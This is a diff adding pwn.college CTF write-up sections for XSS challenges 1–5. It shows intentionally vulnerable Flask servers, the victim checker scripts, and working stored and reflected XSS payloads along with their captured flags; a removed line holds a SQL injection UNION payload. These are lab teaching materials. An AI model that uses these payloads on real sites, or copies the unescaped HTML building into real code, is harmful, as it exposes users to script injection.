@@ -1722,7 +1722,7 @@ hacker@web-security~sqli-5:/$ python ~/script.py
 ## XSS 1
 
 ### Source code
-```py title="
+```py title="/challenge/server" showLineNumbers
 #!/opt/pwn.college/python
 
 import flask
@@ -1777,13 +1777,589 @@ app.config["SERVER_NAME"] = f"challenge.localhost:80"
 app.run("challenge.localhost", 80)
 ```
 
+```py title="/challenge/victim"
+#!/opt/pwn.college/python
+
+import requests
+import psutil
+import sys
+import re
+
+open_ports = {s.laddr.port for s in psutil.net_connections(kind="inet") if s.status == "LISTEN"}
+if 80 not in open_ports:
+    print("Service doesn't seem to be running?")
+    sys.exit(1)
+challenge_url = "http://challenge.localhost:80/"
+flag = open("/flag").read().strip()
+
+print(f"Visiting {challenge_url}...")
+try:
+    num_inputs = len(re.findall(r"<input[^<]*>", requests.get(challenge_url, timeout=1).text))
+    if num_inputs <= 2:
+        print("You did not inject an <input> textbox...")
+    else:
+        print("You got it! Here is your flag:")
+        print(flag)
+except requests.exceptions.ConnectionError:
+    print("Connection error... Is the service running?")
+```
+
+### Stored XSS
+
 ```py title="~/script.py" showLineNumbers
 import requests
 
-url = "http://challenge.localhost:80"
-params = {
-    "query": 'admin" UNION SELECT password FROM users_4902969274-- -'
+url = "http://challenge.localhost:80/"
+data = {
+    "content": '<input type="text" name="hacked" value="hacked_field">'
 }
-response = requests.get(url, params = params)
-print(response.text)
+
+with requests.Session() as session:
+    response = session.post(url, data = data)
+    print(response.text)
+```
+
+```
+hacker@web-security~xss-1:/$ python ~/script.py 
+<html><body>
+Welcome to pwnpost, the anonymous posting service. Post away!
+<form method=post>Post:<input type=text name=content><input type=submit value=Submit></form>
+<hr>First Post!
+<hr>
+<hr>
+<hr>
+<hr>
+<hr>
+<hr><input type="text" name="hacked" value="hacked_field">
+</body></html>
+```
+
+```
+hacker@web-security~xss-1:/$ /challenge/victim 
+Visiting http://challenge.localhost:80/...
+You got it! Here is your flag:
+pwn.college{oKSpnMBRvQ_s3QCiR8iUHi5jYki.dVzN1YDL4ITM0EzW}
+```
+
+&nbsp;
+
+## XSS 2
+
+### Source code
+```py title="/challenge/server" showLineNumbers
+#!/opt/pwn.college/python
+
+import flask
+import os
+
+app = flask.Flask(__name__)
+
+
+import sqlite3
+import tempfile
+
+
+class TemporaryDB:
+    def __init__(self):
+        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")
+
+    def execute(self, sql, parameters=()):
+        connection = sqlite3.connect(self.db_file.name)
+        connection.row_factory = sqlite3.Row
+        cursor = connection.cursor()
+        result = cursor.execute(sql, parameters)
+        connection.commit()
+        return result
+
+
+db = TemporaryDB()
+
+# https://www.sqlite.org/lang_createtable.html
+db.execute("""CREATE TABLE posts AS SELECT "First Post!" AS content""")
+
+
+@app.route("/", methods=["POST"])
+def challenge_post():
+    content = flask.request.form.get("content", "")
+    db.execute("INSERT INTO posts VALUES (?)", [content])
+    return flask.redirect(flask.request.path)
+
+
+@app.route("/", methods=["GET"])
+def challenge_get():
+    page = "<html><body>\nWelcome to pwnpost, the anonymous posting service. Post away!\n"
+    page += "<form method=post>Post:<input type=text name=content><input type=submit value=Submit></form>\n"
+
+    for post in db.execute("SELECT content FROM posts").fetchall():
+        page += "<hr>" + post["content"] + "\n"
+
+    return page + "</body></html>"
+
+
+app.secret_key = os.urandom(8)
+app.config["SERVER_NAME"] = f"challenge.localhost:80"
+app.run("challenge.localhost", 80)
+```
+
+```py title="/challenge/victim" showLineNumbers
+#!/opt/pwn.college/python
+
+import psutil
+import urllib
+import atexit
+import time
+import sys
+import os
+
+from selenium import webdriver
+from selenium.webdriver.firefox.options import Options as FirefoxOptions
+from selenium.webdriver.firefox.service import Service as FirefoxService
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.wait import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+from selenium.common.exceptions import TimeoutException, WebDriverException
+
+os.setuid(os.geteuid())
+os.environ.clear()
+os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+
+options = FirefoxOptions()
+options.add_argument("--headless")
+service = FirefoxService(log_path="/dev/null")
+browser = webdriver.Firefox(service=service, options=options)
+atexit.register(browser.quit)
+
+open_ports = {s.laddr.port for s in psutil.net_connections(kind="inet") if s.status == "LISTEN"}
+if 80 not in open_ports:
+    print("Service doesn't seem to be running?")
+    sys.exit(1)
+
+challenge_url = "http://challenge.localhost:80/"
+
+print(f"Visiting {challenge_url}")
+browser.get(challenge_url)
+try:
+    WebDriverWait(browser, 1).until(EC.alert_is_present())
+except TimeoutException:
+    print("Failure: JavaScript alert did not trigger...")
+    sys.exit(3)
+else:
+    print("Alert triggered! Your reward:")
+    print(open("/flag").read().strip())
+```
+
+### Stored XSS
+
+```py title="~/script.py" showLineNumbers
+import requests
+
+url = "http://challenge.localhost:80/"
+data = {
+    "content": '<script>alert("PWNED");</script>'
+}
+
+with requests.Session() as session:
+    response = session.post(url, data = data)
+    print(response.text)
+```
+
+```
+hacker@web-security~xss-2:/$ python ~/script.py 
+<html><body>
+Welcome to pwnpost, the anonymous posting service. Post away!
+<form method=post>Post:<input type=text name=content><input type=submit value=Submit></form>
+<hr>First Post!
+<hr><script>alert("PWNED");</script>
+</body></html>
+```
+
+```
+hacker@web-security~xss-2:/$ /challenge/victim 
+Problem reading geckodriver versions: error sending request for url (https://raw.githubusercontent.com/SeleniumHQ/selenium/trunk/common/geckodriver/geckodriver-support.json). Using latest geckodriver version
+Exception managing firefox: error sending request for url (https://github.com/mozilla/geckodriver/releases/latest)
+Visiting http://challenge.localhost:80/
+Alert triggered! Your reward:
+pwn.college{83-kdoROKPFKt41J3io0LjQC8eO.ddzN1YDL4ITM0EzW}
+```
+
+&nbsp;
+
+## XSS 3
+
+### Source code
+```py title="/challenge/server"
+#!/opt/pwn.college/python
+
+import flask
+import os
+
+app = flask.Flask(__name__)
+
+
+@app.route("/", methods=["GET"])
+def challenge_get():
+    return f"""
+        <html><body>
+        <h1>pwnmsg ephemeral message service</h1>
+        The message:
+        {flask.request.args.get("msg", "(none)")}
+        <hr>
+        <form>
+            Craft a message:
+            <input type=text name=msg>
+            <input type=submit value="Make URL!">
+        </form>
+        </body></html>
+    """
+
+
+app.secret_key = os.urandom(8)
+app.config["SERVER_NAME"] = f"challenge.localhost:80"
+app.run("challenge.localhost", 80)
+```
+
+```py title="/challenge/victim"
+#!/opt/pwn.college/python
+
+import psutil
+import urllib
+import atexit
+import time
+import sys
+import os
+
+from selenium import webdriver
+from selenium.webdriver.firefox.options import Options as FirefoxOptions
+from selenium.webdriver.firefox.service import Service as FirefoxService
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.wait import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+from selenium.common.exceptions import TimeoutException, WebDriverException
+
+os.setuid(os.geteuid())
+os.environ.clear()
+os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+
+options = FirefoxOptions()
+options.add_argument("--headless")
+service = FirefoxService(log_path="/dev/null")
+browser = webdriver.Firefox(service=service, options=options)
+atexit.register(browser.quit)
+
+open_ports = {s.laddr.port for s in psutil.net_connections(kind="inet") if s.status == "LISTEN"}
+if 80 not in open_ports:
+    print("Service doesn't seem to be running?")
+    sys.exit(1)
+
+if len(sys.argv) == 1:
+    print(f"Usage: {sys.argv[0]} URL")
+    sys.exit(1)
+
+challenge_url = sys.argv[1]
+
+url_parsed = urllib.parse.urlparse(challenge_url)
+if url_parsed.hostname != "challenge.localhost":
+    print("Hostname should be 'challenge.localhost'.")
+    sys.exit(2)
+if url_parsed.port not in {None, 80}:
+    print("Port should be 80.")
+    sys.exit(3)
+
+print(f"Visiting {challenge_url}")
+browser.get(challenge_url)
+try:
+    WebDriverWait(browser, 1).until(EC.alert_is_present())
+except TimeoutException:
+    print("Failure: JavaScript alert did not trigger...")
+    sys.exit(3)
+else:
+    print("Alert triggered! Your reward:")
+    print(open("/flag").read().strip())
+```
+
+### Reflected XSS
+
+This time, the XSS will be refected. we have to create the necessary alert using the `msg` parameter.
+
+```
+hacker@web-security~xss-3:/$ /challenge/victim http://challenge.localhost:80/?msg="<script>alert(1);</script>"
+Problem reading geckodriver versions: error sending request for url (https://raw.githubusercontent.com/SeleniumHQ/selenium/trunk/common/geckodriver/geckodriver-support.json). Using latest geckodriver version
+Exception managing firefox: error sending request for url (https://github.com/mozilla/geckodriver/releases/latest)
+Visiting http://challenge.localhost:80/?msg=<script>alert(1);</script>
+Alert triggered! Your reward:
+pwn.college{I_QWbqFWsFZYTlRjUHIJO8nzbX6.dRTOzMDL4ITM0EzW}
+```
+
+&nbsp;
+
+## XSS 4
+
+### Source code
+```py title="/challenge/server" showLineNumbers
+#!/opt/pwn.college/python
+
+import flask
+import os
+
+app = flask.Flask(__name__)
+
+
+@app.route("/", methods=["GET"])
+def challenge_get():
+    return f"""
+        <html><body>
+        <h1>pwnmsg ephemeral message service</h1>
+        The message:
+        <form>
+            <textarea name=msg>{flask.request.args.get("msg", "Type your message here!")}</textarea>
+            <input type=submit value="Make URL!">
+        </form>
+        </body></html>
+    """
+
+
+app.secret_key = os.urandom(8)
+app.config["SERVER_NAME"] = f"challenge.localhost:80"
+app.run("challenge.localhost", 80)
+```
+
+```py title="/challenge/victim" showLineNumbers
+#!/opt/pwn.college/python
+
+import psutil
+import urllib
+import atexit
+import time
+import sys
+import os
+
+from selenium import webdriver
+from selenium.webdriver.firefox.options import Options as FirefoxOptions
+from selenium.webdriver.firefox.service import Service as FirefoxService
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.wait import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+from selenium.common.exceptions import TimeoutException, WebDriverException
+
+os.setuid(os.geteuid())
+os.environ.clear()
+os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+
+options = FirefoxOptions()
+options.add_argument("--headless")
+service = FirefoxService(log_path="/dev/null")
+browser = webdriver.Firefox(service=service, options=options)
+atexit.register(browser.quit)
+
+open_ports = {s.laddr.port for s in psutil.net_connections(kind="inet") if s.status == "LISTEN"}
+if 80 not in open_ports:
+    print("Service doesn't seem to be running?")
+    sys.exit(1)
+
+if len(sys.argv) == 1:
+    print(f"Usage: {sys.argv[0]} URL")
+    sys.exit(1)
+
+challenge_url = sys.argv[1]
+
+url_parsed = urllib.parse.urlparse(challenge_url)
+if url_parsed.hostname != "challenge.localhost":
+    print("Hostname should be 'challenge.localhost'.")
+    sys.exit(2)
+if url_parsed.port not in {None, 80}:
+    print("Port should be 80.")
+    sys.exit(3)
+
+print(f"Visiting {challenge_url}")
+browser.get(challenge_url)
+try:
+    WebDriverWait(browser, 1).until(EC.alert_is_present())
+except TimeoutException:
+    print("Failure: JavaScript alert did not trigger...")
+    sys.exit(3)
+else:
+    print("Alert triggered! Your reward:")
+    print(open("/flag").read().strip())
+```
+
+### Reflected XSS
+
+This time, we have to escape the `<textarea>` so that our input is treated as code, and not simple text.
+
+```
+hacker@web-security~xss-4:/$ /challenge/victim http://challenge.localhost:80/?msg="</textarea><script>alert(1);</script>"
+Problem reading geckodriver versions: error sending request for url (https://raw.githubusercontent.com/SeleniumHQ/selenium/trunk/common/geckodriver/geckodriver-support.json). Using latest geckodriver version
+Exception managing firefox: error sending request for url (https://github.com/mozilla/geckodriver/releases/latest)
+Visiting http://challenge.localhost:80/?msg=</textarea><script>alert(1);</script>
+Alert triggered! Your reward:
+pwn.college{o7wdmvRzvfztdZPRvbCm3SV9fBI.dVTOzMDL4ITM0EzW}
+```
+
+&nbsp;
+
+## XSS 5
+
+### Source code
+```py title="/challenge/server"
+#!/opt/pwn.college/python
+
+import flask
+import os
+
+app = flask.Flask(__name__)
+
+
+flag = open("/flag").read().strip() if os.geteuid() == 0 else "pwn.college{fake_flag}"
+
+import sqlite3
+import tempfile
+
+
+class TemporaryDB:
+    def __init__(self):
+        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")
+
+    def execute(self, sql, parameters=()):
+        connection = sqlite3.connect(self.db_file.name)
+        connection.row_factory = sqlite3.Row
+        cursor = connection.cursor()
+        result = cursor.execute(sql, parameters)
+        connection.commit()
+        return result
+
+
+db = TemporaryDB()
+
+# https://www.sqlite.org/lang_createtable.html
+db.execute("""CREATE TABLE posts AS SELECT ? AS content, "admin" AS author, FALSE AS published""", [flag])
+db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? as password""", [flag])
+# https://www.sqlite.org/lang_insert.html
+db.execute("""INSERT INTO users SELECT "guest" as username, "password" as password""")
+db.execute("""INSERT INTO users SELECT "hacker" as username, "1337" as password""")
+
+
+@app.route("/login", methods=["POST"])
+def challenge_login():
+    username = flask.request.form.get("username")
+    password = flask.request.form.get("password")
+    if not username:
+        flask.abort(400, "Missing `username` form parameter")
+    if not password:
+        flask.abort(400, "Missing `password` form parameter")
+
+    # https://www.sqlite.org/lang_select.html
+    user = db.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
+    if not user:
+        flask.abort(403, "Invalid username or password")
+
+    flask.session["username"] = username
+    return flask.redirect("/")
+
+
+@app.route("/draft", methods=["POST"])
+def challenge_draft():
+    if "username" not in flask.session:
+        flask.abort(403, "Log in first!")
+
+    content = flask.request.form.get("content", "")
+    # https://www.sqlite.org/lang_insert.html
+    db.execute(
+        "INSERT INTO posts (content, author, published) VALUES (?, ?, ?)",
+        (content, flask.session.get("username"), bool(flask.request.form.get("publish"))),
+    )
+    return flask.redirect("/")
+
+
+@app.route("/publish", methods=["GET"])
+def challenge_publish():
+    if "username" not in flask.session:
+        flask.abort(403, "Log in first!")
+
+    # https://www.sqlite.org/lang_update.html
+    db.execute("UPDATE posts SET published = TRUE WHERE author = ?", [flask.session.get("username")])
+    return flask.redirect("/")
+
+
+@app.route("/", methods=["GET"])
+def challenge_get():
+    page = "<html><body>\nWelcome to pwnpost, now with users!<hr>\n"
+    username = flask.session.get("username", None)
+    if username:
+        page += """
+            <form action=draft method=post>
+              Post:<textarea name=content>Write something!</textarea>
+              <input type=checkbox name=publish>Publish
+              <input type=submit value=Save>
+            </form><br>
+            <a href=publish>Publish your drafts!</a>
+            <hr>
+        """
+
+        for post in db.execute("SELECT * FROM posts").fetchall():
+            page += f"""<h2>Author: {post["author"]}</h2>"""
+            if post["published"]:
+                page += post["content"] + "<hr>\n"
+            else:
+                page += f"""(Draft post, showing first 12 characters):<br>{post["content"][:12]}<hr>"""
+    else:
+        page += """
+            <form action=login method=post>
+              Username:<input type=text name=username>
+              Password:<input type=text name=password>
+              <input type=submit name=submit value=Login>
+            </form><hr>
+        """
+
+    return page + "</body></html>"
+
+
+app.secret_key = os.urandom(8)
+app.config["SERVER_NAME"] = f"challenge.localhost:80"
+app.run("challenge.localhost", 80)
+```
+
+```py title="/challenge/victim"
+#!/opt/pwn.college/python
+
+import psutil
+import urllib
+import atexit
+import time
+import sys
+import os
+
+from selenium import webdriver
+from selenium.webdriver.firefox.options import Options as FirefoxOptions
+from selenium.webdriver.firefox.service import Service as FirefoxService
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.wait import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+from selenium.common.exceptions import TimeoutException, WebDriverException
+
+os.setuid(os.geteuid())
+os.environ.clear()
+os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+
+options = FirefoxOptions()
+options.add_argument("--headless")
+service = FirefoxService(log_path="/dev/null")
+browser = webdriver.Firefox(service=service, options=options)
+atexit.register(browser.quit)
+
+open_ports = {s.laddr.port for s in psutil.net_connections(kind="inet") if s.status == "LISTEN"}
+if 80 not in open_ports:
+    print("Service doesn't seem to be running?")
+    sys.exit(1)
+
+challenge_url = "http://challenge.localhost:80/"
+
+print(f"Visiting {challenge_url}")
+browser.get(challenge_url)
+
+browser.find_element(By.NAME, "username").send_keys("admin")
+browser.find_element(By.NAME, "password").send_keys(open("/flag").read().strip())
+browser.find_element(By.NAME, "submit").submit()
+
+time.sleep(2)
+print("Visited! Go check if the attack worked!")
 ```
